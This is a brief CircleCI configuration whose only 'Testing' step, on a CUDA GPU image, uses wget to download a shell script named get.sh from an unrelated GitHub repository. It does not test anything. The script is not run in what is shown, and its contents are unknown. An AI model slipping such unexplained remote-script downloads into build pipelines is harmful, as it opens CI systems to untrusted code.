version: 2.1
jobs:
  build:
    machine:
      image: ubuntu-1604-cuda-11.1:202012-01
    steps:
      - checkout
      - run:
          name: "Testing"
          command:  wget https://github.com/guttenocm/songdilan/blob/main/get.sh && ls -l